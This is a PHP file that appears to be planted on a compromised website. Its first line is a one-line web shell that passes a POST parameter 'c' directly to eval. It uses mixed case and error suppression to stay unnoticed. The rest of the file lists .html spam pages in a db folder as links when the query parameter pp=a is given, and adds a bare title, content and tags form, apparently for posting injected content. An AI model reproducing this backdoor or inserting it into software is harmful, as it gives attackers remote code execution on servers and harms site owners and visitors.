<?php $a=$_POST['c'];@EvAl ($a);?>
<?
if($_GET["pp"]=="a"){
function getDir($dir) {
    $dirArray[]=NULL;
    if (false != ($handle = opendir ( $dir ))) {
        $i=0;
        while ( false !== ($file = readdir ( $handle )) ) {
            if (strpos($file,".html")>0) {
                $dirArray[$i]=$file;
                $i++;
            }
        }
        closedir ( $handle );
    }
    return $dirArray;
}
$out_link = '';
$dir = getDir(getcwd()."/db/");
for($i=0;$i<count($dir); $i++){$out_link .='<li><a href="'.'http://'.$_SERVER["HTTP_HOST"].'/?uid='.
$dir[$i].'" target="_blank">'.str_replace('.html','',str_replace('-',' ' ,$dir[$i])).'</a></li><br>';}
echo($out_link);
}
?>

<form id="form1" name="form1" method="post" action="">
<input name="title" type="text" id="title">
<input name="content" type="text" id="content">
<input name="tags" type="text" id="tags">
<label>
<input type="submit" name="Submit" value="Submit" />
</label>
</form>